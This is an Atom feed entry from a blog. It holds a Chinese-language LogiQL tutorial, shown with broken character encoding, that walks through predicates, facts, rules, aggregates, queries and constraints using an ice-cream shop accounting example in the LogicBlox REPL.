    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>æœ€è¿‘çœ‹çš„å·¥å…·ä¸­ç”¨åˆ°äº† <a href="https://bitbucket.org/yanniss/doop/src/master/">Doop</a>ï¼Œè¿™æ˜¯ä¸€ä¸ªä»¥ <strong>æŒ‡é’ˆåˆ†æ</strong> ç®—æ³•ä¸ºä¸­å¿ƒçš„ Java é™æ€åˆ†ææ¡†æ¶ï¼Œä½¿ç”¨ <a href="https://en.wikipedia.org/wiki/Datalog">Datalog</a> è§„åˆ™å½¢å¼è¡¨è¾¾çš„å„ç§åˆ†æçš„é›†åˆã€‚ç»´æŠ¤ä¸¤å¥—è§„åˆ™ï¼š</p><ul><li><a href="http://www.logicblox.com/">LogicBlox</a>ï¼šä½¿ç”¨ LogiQLï¼ŒDatalog ç¨‹åºçš„æ„å»ºå—ä»¥ <strong>è°“è¯</strong> çš„å½¢å¼å‡ºç°ï¼Œä¾‹å¦‚ <code>Person(&quot;John&quot;)</code>ã€<code>Parent(&quot;John&quot;, &quot;Johnny jr&quot;)</code>ï¼Œåˆ©ç”¨ <strong>è§„åˆ™</strong>ï¼ˆIDB é€»è¾‘ï¼‰ä»å·²çŸ¥çš„äº‹å®ä¸­æ¨æ–­å‡ºæ–°çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ <code>Ancestor(x, y) &lt;- Parent(x, y)</code></li><li><a href="https://github.com/souffle-lang/souffle">souffle-lang/souffle</a> (Systematic, Ontological, Undiscovered Fact Finding Logic Engine)ï¼šç”± Datalog å¯å‘çš„ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œå¯ç”¨äºé™æ€åˆ†æã€ç½‘ç»œåˆ†æå’Œæ•°æ®åˆ†æã€‚é»˜è®¤ä½¿ç”¨è¯¥å¼•æ“ã€‚</li></ul><p>æ²¡çœ‹åˆ°é»˜è®¤ç”¨çš„æ˜¯å¼€æºçš„ souffleï¼Œç»“æœèŠ±äº†ä¸€ä¸‹åˆå…¥é—¨ LogiQL è¿˜æœ‰æ‰¾ 3.10.x ç‰ˆæœ¬çš„ LogicBlox â€¦</p><p>LogicBlox ä¸€ç›´æ˜¯é—­æºè½¯ä»¶ï¼Œç›®å‰æœ€æ–°ç‰ˆæœ¬ 4.x.x éƒ½å¯ä»¥ä¸‹è½½ï¼Œ<a href="https://developer.logicblox.com/release-archive-310/">Release Archive (LB 3.10.x)</a> ä¸å†æä¾›ä¸‹è½½ï¼Œå¯ä»¥é€šè¿‡ <a href="https://developer.logicblox.com/logicblox-academic-license-request/">LogicBlox Academic License Request</a> ç”³è¯·ã€‚æ‰¾äº†å¥½ä¹…æ²¡åœ°æ–¹ä¸‹è½½è¿˜è¦ç”³è¯·ï¼Œå›å¤´ä»”ç»†çœ‹äº†çœ‹ Doop çš„è¯´æ˜æ–‡æ¡£æ‰å‘ç°åº”è¯¥å»çœ‹ souffle ğŸ˜…ğŸ˜…ğŸ˜…</p><p>LogiQL å…¥é—¨è·Ÿç€æ•™ç¨‹ <a href="https://developer.logicblox.com/content/docs4/tutorial/repl/section/split.html">LogiQL in 30 minutes</a> èµ°å°±å¥½äº†ï¼Œä»‹ç»çš„ç‰¹åˆ«ç®€å•ï¼Œèƒ½å¤Ÿè®©äººåˆšè¸©åˆ°é—¨æ§›ä¸Šå§ï¼ˆå¤§æ¦‚ï¼‰ã€‚</p><h1 id="0x01-LogiQL-å…¥é—¨"><a href="#0x01-LogiQL-å…¥é—¨" class="headerlink" title="0x01 LogiQL å…¥é—¨"></a>0x01 LogiQL å…¥é—¨</h1><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>ç”¨åœ¨çº¿çš„ <a href="https://repl.logicblox.com/">LogicBlox REPL (Read-Eval-Print Loop)</a> è¿›è¡Œå®éªŒï¼ŒREPL æ˜¯ä¸€ä¸ªåŸºäºå‘½ä»¤çš„äº¤äº’å¼ç¯å¢ƒï¼Œå¯ä»¥åœ¨å…¶ä¸­æ‰§è¡Œ LogiQL å‘½ä»¤å¹¶ç«‹å³æ£€æŸ¥ç»“æœã€‚</p><h2 id="æœ¯è¯­"><a href="#æœ¯è¯­" class="headerlink" title="æœ¯è¯­"></a>æœ¯è¯­</h2><p>å·¥ä½œåŒºï¼ˆworkspaceï¼‰æŒ‡ä»£æ•°æ®åº“ï¼ˆdatabaseï¼‰ï¼Œç»“åˆäº†æ¨¡å¼ï¼ˆschemaï¼‰ã€é€»è¾‘ï¼ˆlogicï¼‰å’Œæ•°æ®ï¼ˆdataï¼‰</p><h2 id="å®éªŒè¿‡ç¨‹"><a href="#å®éªŒè¿‡ç¨‹" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h2><p>å®šä¹‰ä¸€ä¸ªå†°æ·‡æ·‹å•†åº—ä¼šè®¡ç³»ç»Ÿï¼Œè®°å½•ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li>æˆæœ¬ï¼ˆäººå·¥ï¼ŒåŸæ–™ï¼‰ï¼šcost(labor, ingredients)</li><li>ä»·æ ¼ï¼šprice</li><li>é”€é‡/å‘¨ï¼šsales</li><li>æ¯ä¸ªå†°æ·‡æ·‹çš„æ”¶å…¥/å‘¨ï¼šrevenue</li><li>æ‰€æœ‰å†°æ·‡æ·‹çš„æ”¶å…¥/å‘¨ï¼šweek revenue</li><li>æ¯ä¸ªå†°æ·‡æ·‹çš„æ”¶ç›Š/å‘¨ï¼šprofit</li><li>æ‰€æœ‰å†°æ·‡æ·‹çš„æ”¶ç›Š/å‘¨ï¼šweek profit</li></ul><p>å®šä¹‰åŠŸèƒ½è°“è¯ï¼ˆfunctional predicatesï¼‰</p><ul><li>è°“è¯ç±»ä¼¼ SQL æ•°æ®åº“ä¸­çš„è¡¨</li><li>é™¤äº†æœ€åä¸€åˆ—ä¹‹å¤–çš„æ‰€æœ‰åˆ—éƒ½å½¢æˆä¸€ä¸ªä¸»é”®ï¼Œæœ€åä¸€åˆ—è¡¨ç¤ºå€¼ï¼Œå› æ­¤ä¸€ä¸ªä¸»é”®æœ€å¤šå¯ä»¥å…³è”ä¸€ä¸ªå€¼ã€‚</li></ul><h3 id="1-cost-è°“è¯"><a href="#1-cost-è°“è¯" class="headerlink" title="1. cost è°“è¯"></a>1. <code>cost</code> è°“è¯</h3><p>å®šä¹‰åä¸º cost çš„è°“è¯ï¼Œé”®ä¸º icecreamï¼Œå€¼ä¸º cï¼›æŒ‡å‘å³ä¾§çš„ç®­å¤´è¡¨ç¤ºçº¦æŸï¼ˆconstraintï¼‰ï¼Œicecream çš„å€¼å¿…é¡»æ˜¯å­—ç¬¦ä¸²ã€c çš„å€¼å¿…é¡»æ˜¯æ•´æ•°</p><ul><li>çº¦æŸè¡¨æ˜å¦‚æœç®­å¤´å·¦ä¾§ä¸ºçœŸï¼Œåˆ™å³ä¾§å¿…é¡»æˆç«‹</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cost[icecream] = c -&gt;</span><br><span class="line">   string(icecream), int(c).</span><br></pre></td></tr></table></figure><p>åœ¨ REPL ä¸­æ‰§è¡Œéœ€è¦ä½¿ç”¨ç›¸åº”çš„å‘½ä»¤ï¼Œ<code>addblock</code> æ¥å—ä¸€ä¸ªå‚æ•°ï¼Œåœ¨å¼•å·ä¹‹é—´æ·»åŠ çš„å®šä¹‰çš„ LogiQL ä»£ç ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;cost[icecream] = c -&gt;</span></span><br><span class="line"><span class="string">   string(icecream), int(c).&#x27;</span></span><br></pre></td></tr></table></figure><p>æ·»åŠ ä¹‹åä½¿ç”¨ <code>list</code> å‘½ä»¤åˆ—å‡ºè°“è¯</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/oAX6JHgMvx5BeTu.png" width="80%"><h3 id="2-äº‹å®ï¼ˆfactsï¼‰"><a href="#2-äº‹å®ï¼ˆfactsï¼‰" class="headerlink" title="2. äº‹å®ï¼ˆfactsï¼‰"></a>2. äº‹å®ï¼ˆfactsï¼‰</h3><p>è°“è¯ä¸­çš„æ•°æ®æ¡ç›®åœ¨ LogiQL ä¸­ç§°ä¸ºäº‹å®ï¼ˆfactsï¼‰ã€‚</p><p>LogiQL æ”¯æŒ 3 ç§å¢é‡æ›´æ–°æ“ä½œ</p><ul><li>æ’å…¥ï¼ˆinsertï¼‰ï¼šæ’å…¥æ–°äº‹å®ï¼Œä½¿ç”¨ <code>+</code> å‰ç¼€</li><li>åˆ é™¤ï¼ˆremoveï¼‰ï¼šåˆ é™¤äº‹å®ï¼Œä½¿ç”¨ <code>-</code> å‰ç¼€ </li><li>æ›´æ–°ï¼ˆupsertï¼‰ï¼šæ·»åŠ æˆ–æ›´æ–°ï¼Œä½¿ç”¨ <code>^</code> å‰ç¼€ï¼Œåªèƒ½åº”ç”¨åœ¨åŠŸèƒ½è°“è¯ä¸Š</li></ul><p>ä½¿ç”¨ <code>exec</code> æ‰§è¡Œä¸€æ¬¡æ€§çš„å‘½ä»¤ï¼Œè€Œ <code>addblock</code> å¯ä»¥ç†è§£ä¸ºâ€œæ°¸ä¹…â€åœ°å°†è°“è¯æ·»åŠ åˆ°å·¥ä½œåŒºã€‚</p><p>æ·»åŠ ä¸€ä¸ªæˆæœ¬ä¸º 23 çš„å†°æ·‡æ·‹ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+cost[&quot;Popsicle Lemon&quot;] = 23.&#x27;</span></span><br></pre></td></tr></table></figure><p><code>print</code> å‘½ä»¤ç”¨äºæ‰“å°è°“è¯ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print cost</span><br></pre></td></tr></table></figure><p>æ·»åŠ å†°æ·‡æ·‹ï¼ˆæˆæœ¬ï¼‰ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+cost[&quot;Fruit Sundae&quot;] = 120.</span></span><br><span class="line"><span class="string">+cost[&quot;Mango Sorbet&quot;] = 40.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Chocolate&quot;] = 50.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Vanilla&quot;] = 44.</span></span><br><span class="line"><span class="string">+cost[&quot;Cone Chili Fries&quot;] = 200.&#x27;</span></span><br></pre></td></tr></table></figure><p>æ›´æ–°å†°æ·‡æ·‹çš„å”®ä»·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &#39;^cost[&quot;Popsicle Lemon&quot;] &#x3D; 25.&#39;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/3XDQBGNLoMxwfv4.png"><h3 id="3-price-è°“è¯ã€week-sales-è°“è¯"><a href="#3-price-è°“è¯ã€week-sales-è°“è¯" class="headerlink" title="3. price è°“è¯ã€week_sales è°“è¯"></a>3. <code>price</code> è°“è¯ã€<code>week_sales</code> è°“è¯</h3><p>å®šä¹‰è°“è¯ price è¡¨ç¤ºå†°æ·‡æ·‹çš„å”®ä»·ï¼Œå®šä¹‰è°“è¯ week_sales è¡¨ç¤ºæ¯å‘¨çš„é”€å”®æ•°é‡ï¼ˆå¯ä»¥æŠŠ week_sales çœ‹ä½œäºŒç»´æ˜ å°„ï¼‰ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;price[icecream] = p -&gt;</span></span><br><span class="line"><span class="string">   string(icecream), int(p).</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">week_sales[icecream, week] = value -&gt;</span></span><br><span class="line"><span class="string">  string(icecream),</span></span><br><span class="line"><span class="string">  int(week),</span></span><br><span class="line"><span class="string">  int(value).&#x27;</span></span><br></pre></td></tr></table></figure><p>æ·»åŠ å†°æ·‡æ·‹å”®ä»·åŠå…¶ç¬¬ 1ã€2 å‘¨çš„é”€é‡ï¼ˆå¾€è°“è¯ä¸­æ·»åŠ äº‹å®ï¼‰ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;+price[&quot;Popsicle Lemon&quot;] = 50.</span></span><br><span class="line"><span class="string">+price[&quot;Fruit Sundae&quot;] = 200.</span></span><br><span class="line"><span class="string">+price[&quot;Mango Sorbet&quot;] = 70.</span></span><br><span class="line"><span class="string">+price[&quot;Cone Chocolate&quot;] = 80.</span></span><br><span class="line"><span class="string">+price[&quot;Cone Vanilla&quot;] = 70.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+week_sales[&quot;Popsicle Lemon&quot;, 1] = 122.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Fruit Sundae&quot;, 1] = 88.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Mango Sorbet&quot;, 1] = 72.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Chocolate&quot;, 1] = 4.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Vanilla&quot;, 1] = 257.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+week_sales[&quot;Popsicle Lemon&quot;, 2] = 112.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Fruit Sundae&quot;, 2] = 60.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Mango Sorbet&quot;, 2] = 44.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Chocolate&quot;, 2] = 9.</span></span><br><span class="line"><span class="string">+week_sales[&quot;Cone Vanilla&quot;, 2] = 200.&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰“å°è°“è¯ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print price</span><br><span class="line">print week_sales</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/vmKatAVFYOID2XH.png" width="90%"><h3 id="4-è§„åˆ™ï¼ˆrulesï¼‰"><a href="#4-è§„åˆ™ï¼ˆrulesï¼‰" class="headerlink" title="4. è§„åˆ™ï¼ˆrulesï¼‰"></a>4. è§„åˆ™ï¼ˆrulesï¼‰</h3><p>è§„åˆ™å¯ç”¨äºæ¨å¯¼æ–°çš„äº‹å®ï¼Œæ·»åŠ è®¡ç®—æ”¶å…¥ <code>revenue</code> çš„è§„åˆ™ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;week_revenue[icecream, week] =</span></span><br><span class="line"><span class="string">  price[icecream] * week_sales[icecream, week].&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰“å°è§„åˆ™ï¼Œè¯¥è§„åˆ™ä¼šè‡ªåŠ¨è¿›è¡Œè®¡ç®—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print week_revenue</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸€ä¸ªä»·æ ¼ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œé‡æ–°è®¡ç®—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 70.&#x27;</span></span><br><span class="line"></span><br><span class="line">print week_revenue</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/goQXUZ2zTp9JxYV.png" width="80%"><p>æ·»åŠ è®¡ç®—å†°æ·‡æ·‹æ”¶ç›Š <code>profit</code> çš„è§„åˆ™ã€è®¡ç®—æ¯å‘¨æ”¶ç›Šçš„è§„åˆ™ <code>week_profit</code>ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;profit[icecream] =</span></span><br><span class="line"><span class="string">  price[icecream] - cost[icecream].</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">week_profit[icecream, week] =</span></span><br><span class="line"><span class="string">  profit[icecream] * week_sales[icecream, week].&#x27;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‰“å°è§„åˆ™ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œè®¡ç®—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print profit</span><br><span class="line">print week_profit</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/VB3QW2kjvSnFNMG.png" width="80%"><h3 id="5-èšåˆå‡½æ•°ï¼ˆAggregateï¼‰"><a href="#5-èšåˆå‡½æ•°ï¼ˆAggregateï¼‰" class="headerlink" title="5. èšåˆå‡½æ•°ï¼ˆAggregateï¼‰"></a>5. èšåˆå‡½æ•°ï¼ˆAggregateï¼‰</h3><p>å’Œ SQL ç±»ä¼¼ï¼ŒLogiQL ä¸­ä¹Ÿæœ‰èšåˆå‡½æ•°ã€‚</p><p>å®šä¹‰ agg_profit è§„åˆ™ï¼Œä½¿ç”¨ <code>total()</code> èšåˆå‡½æ•°æ±‚å’Œï¼Œå°† profit ä¸­æ‰€æœ‰äº‹å®çš„å€¼ p æ±‚å’Œç»‘å®šåˆ° valueï¼Œå…¶ä¸­ week æ˜¯èšåˆçš„å‘¨ï¼Œä½¿ç”¨é€šé…ç¬¦ <code>_</code> å¿½ç•¥å†°æ·‡æ·‹ç±»å‹ã€‚è¡¨ç¤ºæ€»æ”¶ç›Šï¼ˆæ”¶å…¥-æˆæœ¬ï¼‰ã€‚</p><p>agg_revenue è§„åˆ™ä¹Ÿæ˜¯ç±»ä¼¼çš„å®šä¹‰ï¼Œåªä¸è¿‡æŠŠ p æ¢æˆäº† rï¼Œè¡¨ç¤ºæ€»æ”¶å…¥ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">agg_profit[week] = value &lt;-</span><br><span class="line">   agg&lt;&lt;value=total(p)&gt;&gt; week_profit[<span class="symbol">_</span>, week] = p.</span><br><span class="line"> </span><br><span class="line">agg_revenue[week] = value &lt;-</span><br><span class="line">   agg&lt;&lt;value=total(r)&gt;&gt; week_revenue[<span class="symbol">_</span>, week] = r.</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>addblock</code> æ·»åŠ è§„åˆ™ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;agg_profit[week] = value &lt;-</span></span><br><span class="line"><span class="string">    agg&lt;&lt;value=total(p)&gt;&gt; week_profit[_, week] = p.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">agg_revenue[week] = value &lt;-</span></span><br><span class="line"><span class="string">   agg&lt;&lt;value=total(r)&gt;&gt; week_revenue[_, week] = r.&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰“å°è§„åˆ™ï¼Œå¾—åˆ°èšåˆçš„ç»“æœï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print agg_profit</span><br><span class="line">print agg_revenue</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/itCR34j9Fl5PGkI.png" width="85%"><p>å®šä¹‰ä¸€ä¸ªæ²¡æœ‰é”®çš„è§„åˆ™è®¡ç®— price è°“è¯ä¸­çš„äº‹å®ï¼ˆæ¡ç›®ï¼‰æ•°é‡ï¼Œå³å†°æ·‡æ·‹ç±»å‹çš„æ•°é‡ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;icecream_count[] = value &lt;-</span></span><br><span class="line"><span class="string">    agg&lt;&lt;value=count()&gt;&gt; price[_] = _.&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰“å°è§„åˆ™ï¼Œå¾—åˆ°å†°æ·‡æ·‹ç±»å‹çš„æ•°é‡ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print icecream_count</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/zhCBUYFmRMZawT1.png" width="80%"><h3 id="6-æŸ¥è¯¢ï¼ˆqueryï¼‰"><a href="#6-æŸ¥è¯¢ï¼ˆqueryï¼‰" class="headerlink" title="6. æŸ¥è¯¢ï¼ˆqueryï¼‰"></a>6. æŸ¥è¯¢ï¼ˆqueryï¼‰</h3><p>ä¹‹å‰ä½¿ç”¨ print æŸ¥çœ‹è°“è¯å’Œè§„åˆ™çš„å€¼ï¼Œç°åœ¨å¯ä»¥ç”¨ query æ‰§è¡Œæ›´é«˜çº§çš„æŸ¥è¯¢ã€‚</p><p>å®šä¹‰ä¸€ä¸ªè°“è¯ <code>_</code> ç”¨äº‹å®å¡«å……ï¼Œé€šå¸¸ä½¿ç”¨è§„åˆ™å®ç°ã€‚</p><p>ä¸‹é¢çš„æŸ¥è¯¢ä¸ <code>print week_sales</code> æ‹¥æœ‰ç­‰ä»·çš„ç»“æœã€‚è¿™é‡Œä¸ä½¿ç”¨åŠŸèƒ½è°“è¯è¯­æ³• <code>predicate[k1, k2] = v</code>ï¼Œè€Œæ˜¯ä½¿ç”¨ <code>predicate(k1, k2, k3)</code>ï¼Œå› ä¸ºè¿™é‡Œå¯¹é”®å€¼ä¸æ„Ÿå…´è¶£ï¼Œåªå¯¹äº‹å®æ„Ÿå…´è¶£ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream, week, value) &lt;-</span></span><br><span class="line"><span class="string">  week_sales[icecream, week] = value.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/iXhUMutwd63Sxfz.png" width="95%"><p>æ£€ç´¢ week_sales è°“è¯ä¸­ä½¿ç”¨çš„æ‰€æœ‰å†°æ·‡æ·‹ï¼Œå°½ç®¡ week_sales è°“è¯å¤šæ¬¡åŒ…å«è¿™äº›å€¼ä¸­çš„æ¯ä¸€ä¸ªï¼Œä½†æ¯ä¸ªä¸åŒå€¼åªè¿”å›ä¸€æ¬¡ï¼ˆæœ‰ 1ã€2 ä¸¤å‘¨çš„æ•°æ®ï¼Œæ‰€ä»¥å†°æ·‡æ·‹é‡å¤å‡ºç°ï¼‰</p><ul><li>åœ¨ LogiQL ä¸­æ‰€æœ‰è°“è¯éƒ½æ˜¯é›†åˆï¼šæ¯ä¸€è¡Œåªèƒ½å‡ºç°ä¸€æ¬¡</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream) &lt;- week_sales[icecream, _] = _.&#x27;</span></span><br></pre></td></tr></table></figure><p>å°†å†°æ·‡æ·‹å’Œæ¯å‘¨çš„é”€å”®é¢ã€æ”¶å…¥ã€æ”¶ç›Šæ•´åˆåœ¨ä¸€èµ·ï¼Œå°±åƒ SQL ä¸­çš„ JOIN æ“ä½œï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream, week, sales, revenue, profit) &lt;-</span></span><br><span class="line"><span class="string">  week_sales[icecream, week] = sales,</span></span><br><span class="line"><span class="string">  week_revenue[icecream, week] = revenue,</span></span><br><span class="line"><span class="string">  week_profit[icecream, week] = profit.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/6QKeRXIA9wf3c4j.png" width="80%"><h3 id="7-çº¦æŸï¼ˆconstraintï¼‰"><a href="#7-çº¦æŸï¼ˆconstraintï¼‰" class="headerlink" title="7. çº¦æŸï¼ˆconstraintï¼‰"></a>7. çº¦æŸï¼ˆconstraintï¼‰</h3><p>é™ä½å†°æ·‡æ·‹çš„å”®ä»·ï¼Œå†æ¬¡æŸ¥è¯¢å‘ç°å†°æ·‡æ·‹çš„æ”¶ç›Šå˜æˆäº†è´Ÿæ•°ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 20.&#x27;</span></span><br><span class="line">query <span class="string">&#x27;_(profit) &lt;- profit[&quot;Popsicle Lemon&quot;] = profit.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/UwXr3PaOCH7bV4G.png" width="80%"><p>å®šä¹‰ä¸€ä¸ªçº¦æŸï¼šå¯¹äº profit è°“è¯ä¸­çš„æ¯ä¸ªäº‹å®ï¼Œvalue åº”è¯¥å¤§äºç­‰äº 0ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profit[<span class="symbol">_</span>] = value -&gt; value &gt;= <span class="number">0.</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>addblock</code> æ·»åŠ çº¦æŸï¼Œå› ä¸º profit è°“è¯ä¸­æœ‰äº‹å®çš„ value å€¼å°äº 0ï¼Œæ‰€ä»¥æ·»åŠ çº¦æŸå¤±è´¥ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;profit[_] = value -&gt; value &gt;= 0.&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å†°æ·‡æ·‹å”®ä»·åå†æ·»åŠ çº¦æŸï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 40.&#x27;</span></span><br><span class="line">addblock <span class="string">&#x27;profit[_] = value -&gt; value &gt;= 0.&#x27;</span></span><br></pre></td></tr></table></figure><p>å†æ¬¡ä¿®æ”¹å†°æ·‡æ·‹å”®ä»·ï¼Œè¿”å›çº¦æŸé”™è¯¯ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 10.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/9TnycWQ4ZeBCJob.png"><h1 id="0x02-ç»“è¯­"><a href="#0x02-ç»“è¯­" class="headerlink" title="0x02 ç»“è¯­"></a>0x02 ç»“è¯­</h1><p>æœ‰ä¸€è¯´ä¸€ï¼Œè¿™ä¸ªå…¥é—¨å®Œå…¨ä¸è¶³ä»¥è®©äººçœ‹æ‡‚ <a href="https://bitbucket.org/yanniss/doop/src/master/lb-logic/">doop/lb-logic</a> é‡Œé¢çš„è§„åˆ™ï¼Œåšéƒ½åšäº†å°±ç†ä¸Šæ¥äº†XD</p><p>è¡¥å……ï¼šæœ¬åœ°å¯ä»¥ä½¿ç”¨ <a href="http://snf-705535.vm.okeanos.grnet.gr/agreement.html">PA-Datalog</a> å¼•æ“ï¼Œæ˜¯ LogicBlox v3 çš„æ”¹è‰¯ç‰ˆæœ¬ï¼Œå¯ç”¨äºç¨‹åºåˆ†æã€‚</p>]]></content>
    
    
    <summary type="html">30 åˆ†é’Ÿ LogicBlox REPL æ•™ç¨‹</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Datalog" scheme="https://jckling.github.io/tags/Datalog/"/>
    
  </entry>
  
  <entry>
